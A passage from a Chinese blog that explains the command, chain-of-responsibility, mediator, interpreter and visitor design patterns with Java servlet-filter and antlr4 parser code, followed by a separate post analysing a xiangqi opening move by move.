<p>Receiver: 实际执行命令的对象</p>
<p>Command: 命令类型父类, Command可以有不同子类定义实际的命令类型</p>
<p>Invoker: 使用Command的入口, 也就是封装命令的对象</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420182349051.png" alt="image-20250420182347577"></p>
<p>如图所示, 这是一个shell命令执行器.</p>
<p>其中Executor就是实际命令执行器, 也就是Receiver, 其execute参数接受一个shell命令字符串, 并调用system函数执行之</p>
<p>Command是命令类型基类, 其getCommand类型汇报自己对应的shell命令, 其execute负责拼接shell命令与参数 ,并交由Executor执行. Command类中持有一个Executor的引用executor</p>
<p>Invoker是封装的一次命令执行, 在Invoker中设置好参数与对应命令类, 即可在任意时刻调用invoke执行命令</p>
<blockquote>
<p>invoke和call的区别:</p>
<p>两者都用于表示“调用”</p>
<p>call通常指直接的函数调用, 直接使用函数名调用</p>
<p>invoke通常指动态上下文中,使用反射&#x2F;委托&#x2F;回调等场景</p>
</blockquote>
<h4 id="职责链模式"><a href="#职责链模式" class="headerlink" title="职责链模式"></a>职责链模式</h4><p>过滤器和拦截器均采用职责链模式</p>
<p>以过滤器为例, 过滤器通常应用于用户权限检查&#x2F;防止乱码&#x2F;设置响应编码等场景</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420210150821.webp" alt="img"></p>
<p>在javaweb编程中注册一个过滤器非常方便:</p>
<p>1.实现过滤器类</p>
<p>2.在web.xml中注册过滤器映射</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.xzg.cd.LogFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>logFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>完美符合开放-封闭原则</p>
<p>看一下时序图, 可以发现各个Filter是递归调用的, 而不是平行地遍历了一遍</p>
<blockquote>
<p>图来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cenyu/p/6200495.html#12%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F">Servlet过滤器 - 洋葱源码 - 博客园</a></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420212542498.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">		FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">	<span class="comment">//prehandler</span></span><br><span class="line">	chain.doFilter(request, response);</span><br><span class="line">       <span class="comment">//posthandler</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>UML类图表示为:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250420220616312.png" alt="image-20250420220614007"></p>
<p>职责链模式有一个链管理器, 也就是FilterChain, 其中可以有多个职责类, 理想状态下每个指责类只负责一种职责, 比如字符过滤器只负责过滤输入中的危险字符, 大写过滤器只负责将输出中所有小写字符转化成大写</p>
<p>各个职责可以采用递归嵌套, 也可以平行遍历.</p>
<p>但是在Filter这里由于有pre和post两个处理函数, 只能采取递归</p>
<h4 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h4><p>中介者模式通过引入中介者类，将原本模块之间互相调用的关系， 转化为经过中介者沟通的模式， 实现了模块间解耦</p>
<p>房地产交流平台是“房地产中介公司”提供给“卖方客户”与“买方客户”进行信息交流的平台，比较适合用中介者模式来实现。</p>
<p>聊天室中server作为中介者</p>
<p>实际上是星状结构</p>
<h4 id="解释器模式"><a href="#解释器模式" class="headerlink" title="解释器模式"></a>解释器模式</h4><p>再别多说, 给定一个语言, 定义其语法表示, 并定义解释器, 用解释器来解释该语言中的句子</p>
<h4 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h4><p>以Antlr4的实现为例, 学习其访问者模式的实现</p>
<h5 id="访问者模式的作用时机"><a href="#访问者模式的作用时机" class="headerlink" title="访问者模式的作用时机"></a>访问者模式的作用时机</h5><p>编译器前端由词法分析器lexer和语法分析器parser组成, 前端的作用时, 输入一段目标语言的源代码, 输出语法树</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source code ====&gt; front end ====&gt; grammer tree</span><br></pre></td></tr></table></figure>

<p>编译器后端就是语义分析, 在antlr4中语义分析可以采用访问者模式 或者 监听者模式实现. 后端的作用是, 输入一个语法树, 进行语义分析, 也就是解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grammer tree ====&gt; back end ====&gt; semantic analyze</span><br></pre></td></tr></table></figure>

<p>其中visitor就在<code>编译器后端====&gt;语义结果</code>这一步发挥作用</p>
<h5 id="语法树节点结构"><a href="#语法树节点结构" class="headerlink" title="语法树节点结构"></a>语法树节点结构</h5><p>那么visitor的参数就是语法树的root节点</p>
<p>所有语法树节点的接口:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ParseTree</span> <span class="keyword">extends</span> <span class="title class_">SyntaxTree</span> &#123;</span><br><span class="line">    ParseTree <span class="title function_">getParent</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    ParseTree <span class="title function_">getChild</span><span class="params">(<span class="type">int</span> childindex)</span>;		<span class="comment">//返回第childindex个子节点的下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setParent</span><span class="params">(RuleContext var1)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;	<span class="comment">//为了实现访问者模式, 需要每个语法树节点实现accept接口</span></span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getText</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">toStringTree</span><span class="params">(Parser var1)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所有语法节点类的抽象父类:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserRuleContext</span> <span class="keyword">extends</span> <span class="title class_">RuleContext</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;ParseTree&gt; children;		<span class="comment">//存放子节点</span></span><br><span class="line">    <span class="keyword">public</span> Token start;</span><br><span class="line">    <span class="keyword">public</span> Token stop;</span><br><span class="line">    <span class="keyword">public</span> RecognitionException exception;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体的语法节点类由.g4规则文件给出, 这个g4文件就是人工撰写的词法语法规则文件, 比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">program :  ( statement SEMICO )*  EOF  ;</span><br><span class="line"></span><br><span class="line">statement :  scaleStatment | rotStatment    | forStatment |statColor |statSize |  originStatment|statVar  ;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250421211024147.png" alt="image-20250421211020863"></p>
<p>antlr4会在处理g4文件时, 将<code>program</code>语法对应建立一个<code>ProgramContext</code>语法树节点类</p>
<p>同样<code>statement</code>语法也会建立一个<code>StatementContext</code>语法树节点类</p>
<h5 id="语法树节点的accept接口"><a href="#语法树节点的accept接口" class="headerlink" title="语法树节点的accept接口"></a>语法树节点的accept接口</h5><p>在<code>ParseTree</code>接口中规定, 为了能够使用<code>visitor</code>模式, 需要每个语法树节点实现<code>accept</code>接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; var1)</span>;</span><br></pre></td></tr></table></figure>

<p>比如<code>ProgramContext</code>节点类是这样实现的:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ProgramContext</span> <span class="keyword">extends</span> <span class="title class_">ParserRuleContext</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是直接调用了<code>DrawGraphVisitor.visitProgram()</code></p>
<p>又比如<code>StatScaleContext</code>节点类这样实现:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static class StatScaleContext extends ScaleStatmentContext &#123;</span><br><span class="line">...</span><br><span class="line">	@Override</span><br><span class="line">	public &lt;T&gt; T accept(ParseTreeVisitor&lt;? extends T&gt; visitor) &#123;</span><br><span class="line">		if ( visitor instanceof DrawGraphVisitor ) return ((DrawGraphVisitor&lt;? extends T&gt;)visitor).visitStatScale(this);</span><br><span class="line">		else return visitor.visitChildren(this);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是直接调用了<code>DrawGraphVisitor.visitStatScale()</code></p>
<p>整个过程是这样的:</p>
<p>访问者: 节点, 我能访问你吗? 我应该怎么访问你呢? </p>
<p><code>StateScaleContext</code>节点: 同意访问, 你得去用你的<code>visitStatScale</code>方法来访问我.</p>
<p>为什么访问者不能直接调用自己的<code>visitStatScale</code>方法, 而是先调用节点的accept方法呢?</p>
<p>这是因为, 当访问者来到当前节点家门口时, 访问者并不知道当前节点是个什么具体类型的节点, 访问者只知道节点的多态基类.</p>
<p>因此访问者不知道应该对当前节点进行什么操作, 因此节点需要在自己的accept函数中, 告知访问者访问协议, 也就是由节点指引访问者访问当前节点的方法</p>
<p>那么接下来的问题是, <code>visitProgram</code>这种具体的访问协议是如何实现的?</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>类名</th>
<th>职责</th>
<th>位置</th>
</tr>
</thead>
<tbody><tr>
<td>接口</td>
<td>ParseTreeVisitor</td>
<td>声明visit接口, visitChildren接口等</td>
<td>jar库</td>
</tr>
<tr>
<td>抽象类</td>
<td>AbstractParseTreeVisitor</td>
<td>实现visit接口, visitChildren接口等</td>
<td>jar库</td>
</tr>
<tr>
<td>类</td>
<td>DrawGraphBaseVisitor</td>
<td>实现默认的visitStatScale等具体协议</td>
<td>antlr4命令生成</td>
</tr>
<tr>
<td>类</td>
<td>EvalVisitor</td>
<td>自定义visitStatScale等具体协议</td>
<td>程序员撰写</td>
</tr>
</tbody></table>
<p><code>DrawGraphBaseVisitor</code>由antlr4自动生成, 其中定义了默认的访问协议方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">AbstractParseTreeVisitor</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">DrawGraphVisitor</span>&lt;T&gt; &#123;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitStatement</span><span class="params">(DrawGraphParser.StatementContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">       <span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见默认的方法是直接访问子节点去, 走马观花</p>
<p>真正的访问协议需要程序员撰写, 继承<code>DrawGraphBaseVisitor</code>重写同名函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvalVisitor</span> <span class="keyword">extends</span> <span class="title class_">DrawGraphBaseVisitor</span>&lt;Double&gt;</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> Double <span class="title function_">visitStatScale</span><span class="params">(DrawGraphParser.StatScaleContext ctx)</span> &#123;	<span class="comment">//重写visitStatScale函数</span></span><br><span class="line">	    scaleX = visit( ctx.expr(<span class="number">0</span>) );		<span class="comment">//0下标的子节点</span></span><br><span class="line">	    scaleY = visit( ctx.expr(<span class="number">1</span>) );		<span class="comment">//1下表的子节点</span></span><br><span class="line">	    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="访问者控制流"><a href="#访问者控制流" class="headerlink" title="访问者控制流"></a>访问者控制流</h5><p>下面跟随访问者的控制流, 看一下accept和visit是如何配合的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BackEnd入口:</span></span><br><span class="line"><span class="type">EvalVisitor</span> <span class="variable">eval</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);		<span class="comment">//这里tree就是语法树的树根节点, 也就是一个programContext节点类</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">	<span class="keyword">public</span> T <span class="title function_">visit</span><span class="params">(ParseTree tree)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> tree.accept(<span class="built_in">this</span>);			<span class="comment">//多态调用了programContext.accept()</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in class ProgramContext</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">        <span class="comment">//EvalVisitor类没有重写visitProgram()方法, 因此调用了DrawGraphBaseVisitor.visitProgram()</span></span><br><span class="line">        <span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitProgram(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class DrawGraphBaseVisitor</span></span><br><span class="line">	<span class="meta">@Override</span> <span class="keyword">public</span> T <span class="title function_">visitProgram</span><span class="params">(DrawGraphParser.ProgramContext ctx)</span> &#123; <span class="keyword">return</span> visitChildren(ctx); &#125;</span><br><span class="line">	<span class="comment">//programContext实际上就是一个statementContext数组, 因此不需要特殊操作, 直接独立地访问子节点statementContext即可</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class AbstractParseTreeVisitor</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">visitChildren</span><span class="params">(RuleNode node)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.defaultResult();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> node.getChildCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n &amp;&amp; <span class="built_in">this</span>.shouldVisitNextChild(node, result); ++i) &#123;</span><br><span class="line">            <span class="type">ParseTree</span> <span class="variable">c</span> <span class="operator">=</span> node.getChild(i);</span><br><span class="line">            <span class="type">T</span> <span class="variable">childResult</span> <span class="operator">=</span> c.accept(<span class="built_in">this</span>);		<span class="comment">//遍历每个子节点, 调用其accept方法</span></span><br><span class="line">            result = <span class="built_in">this</span>.aggregateResult(result, childResult);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>到此程序控制流又进入了<code>accept</code>方法中, 只不过这次应该是<code>StatementContext.accept</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in class StatementContext</span></span><br><span class="line">		<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> DrawGraphVisitor ) <span class="keyword">return</span> ((DrawGraphVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitStatement(<span class="built_in">this</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>…</p>
<p>也就是说在具体的访问协议, 比如<code>visitStatement</code>或者<code>visitStatScale</code>等等, 如果程序员有在<code>EvalVisitor</code>中重写, 则调用程序员自定义的</p>
<p>否则调用<code>antlr4</code>在<code>DrawGraphBaseVisitor</code>中生成的默认的</p>
<h5 id="访问器模式总结"><a href="#访问器模式总结" class="headerlink" title="访问器模式总结"></a>访问器模式总结</h5><p>1.访问者类的visit接口, 用于与语法树节点类accept接口建立连接, 协商针对该节点的具体访问协议</p>
<p>2.访问者类要知道所有可能的语法树节点类型, 并实现所有具体的访问协议</p>
<p>3.语法树的节点类要实现accept接口, 用于与访问者的visit接口协商本节点的具体访问协议, 告知访问者本节点的具体类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">visitor.visit(node)</span><br><span class="line">	=&gt; node.accept(visitor)</span><br><span class="line">		=&gt; visitor.visitConcrete1(node)</span><br></pre></td></tr></table></figure>



<h3 id="设计模式关系"><a href="#设计模式关系" class="headerlink" title="设计模式关系"></a>设计模式关系</h3><p>图片来自菜鸟教程</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/mmexport1707099938077.png" alt="设计模式之间的关系"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/11/[%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94]%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/11/%5B%E7%96%91%E5%BD%A2%E6%8E%A8%E6%BC%94%5D%20%E4%B8%AD%E7%82%AE%E8%BF%87%E6%B2%B3%E8%BD%A6%E4%BA%92%E8%BF%9B%E4%B8%83%E5%85%B5%E5%AF%B9%E5%B1%8F%E9%A3%8E%E9%A9%AC%E5%B7%A6%E9%A9%AC%E7%9B%98%E6%B2%B3%20-%20%E7%BA%A2%E4%B8%83%E8%B7%AF%E9%A9%AC/" class="post-title-link" itemprop="url">中炮过河车互进七兵对屏风马左马盘河  红七路马 黑盘河马踩三兵 疑形推演</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-11 03:10:00 / Modified: 04:00:32" itemprop="dateCreated datePublished" datetime="2025-04-11T03:10:00+08:00">2025-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="疑形推演-中炮过河车互进七兵对屏风马左马盘河-红七路马-黑盘河马踩三兵"><a href="#疑形推演-中炮过河车互进七兵对屏风马左马盘河-红七路马-黑盘河马踩三兵" class="headerlink" title="[疑形推演] 中炮过河车互进七兵对屏风马左马盘河 - 红七路马 黑盘河马踩三兵"></a>[疑形推演] 中炮过河车互进七兵对屏风马左马盘河 - 红七路马 黑盘河马踩三兵</h1><h2 id="对局记录"><a href="#对局记录" class="headerlink" title="对局记录"></a>对局记录</h2><ol>
<li><p>炮二平五 马８进７</p>
</li>
<li><p>马二进三 卒７进１</p>
</li>
<li><p>车一平二 车９平８</p>
</li>
<li><p>车二进六 马２进３</p>
</li>
<li><p>兵七进一 马７进６</p>
</li>
<li><p>马八进七 马６进７ ？</p>
</li>
<li><p>炮八进四 象７进５ ？</p>
</li>
<li><p>炮五进四 士 4 进 5  ？</p>
</li>
</ol>
<h2 id="复盘分析"><a href="#复盘分析" class="headerlink" title="复盘分析"></a>复盘分析</h2><ol>
<li>炮二平五 马８进７</li>
<li>马二进三 卒７进１</li>
<li>车一平二 车９平８</li>
<li>车二进六 马２进３</li>
<li>兵七进一 马７进６</li>
<li>马八进七 …</li>
</ol>
<blockquote>
<p>到此双方走的都是正着，形成了中炮过河车互进七兵对屏风马左马盘河 - 红七路马 局面</p>
<p>此时黑方应该飞象3进5等一手，</p>
</blockquote>
<ol start="6">
<li>马八进七 马６进７</li>
</ol>
<blockquote>
<p>黑盘河马先踩红三兵得一个实惠，然而也就失去了冲7卒踩红车的反击，黑左路留下了无根车炮被牵制。</p>
<p>并且此时黑方中路空虚， 红方立刻进攻黑方中路。有（1）炮八进四 （2）马七进六（3）兵五进一 三种走法</p>
<p>（1）炮八进四</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410222650589.png" alt="image-20250410222650589" style="zoom:50%;" />

<p>红方的目的是给黑方打空头炮， 此时黑方3卒和5卒都挺不起来。</p>
<p>黑方应马7进5换掉红中炮，如此红方中路攻势锐减。此后的变化：</p>
<ol start="7">
<li><p>炮八进四 马7进5</p>
</li>
<li><p>象七进五 象7进5 （或者车1进1，区别不是很大，黑先出车并不会得到什么先手）</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224605022.png" alt="image-20250410224605022" style="zoom:50%;" />

<p>此局面下黑方右马看似有左炮为根，但是左炮后面拉着车，是个哑炮。</p>
<p>因此红方的进攻矛头就是黑右马，如何进攻黑右马？如果红马能踩踏黑中卒，就可以打到黑马。</p>
<p>因此接下来红马三进四，马七进六直取黑中路</p>
<ol start="9">
<li><p>马三进四 车1进1</p>
</li>
<li><p>马四进五 …</p>
</li>
</ol>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410224742766.png" alt="image-20250410224742766" style="zoom:50%;" />

<p>此局面下黑右马受攻，黑方应法有马3进5&#x2F;车1平3&#x2F;车1平8</p>
<p><strong>&lt;1&gt;</strong> 如果黑走🐎3进5：</p>
<ol start="10">
<li><p>马四进五 马3进5</p>
</li>
<li><p>炮八平五 士4进5， 此处黑补花士象比较好，否则左侧太空了</p>
</li>
</ol>
<p>此局面下红方的进攻思路有两种：</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410230214598.png" alt="image-20250410230214598" style="zoom: 50%;" />

<p>I.⚡其一是出左直车先手抓炮，然后进到卒林准备杀3卒，对黑底象施加压力。</p>
<p>如果黑方躲2路炮则红方立刻沉底车，先手叫铁门栓，</p>
<p>黑方要么出将，要么车1平3死守，</p>
<p>红马闲庭信步上就完了，目标黑中象</p>
<img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250410231222464.png" alt="黑平2炮，红沉底车" style="zoom: 67%;" />

<p>因此此处黑方正手是车8平7，不能躲炮。</p>
<p>那么红还是两条路线，要么车八进六再平七，要么就冲中兵缓进。</p>
<p>II. 🐌其二是冲中兵，盘中马， 徐图进展</p>
<p>III. 💀千万不可马七进六，会遭到黑车1平4反击，此时红马没有好去处，更不可冲动踩3卒，黑可以立刻车4进2然后炮2进1硬吃红中炮，红方立刻崩盘</p>
<p>**&lt;2&gt;**如果黑走🚗1平3</p>
<ol start="10">
<li>马四进五 车1平3</li>
</ol>
<p>此时红方有多种走法，一是马五进三换马，二是不急着换马。<br>换马并不好，黑方在3路车卒配合下有反击，红方需要冲中兵盘中马防御</p>
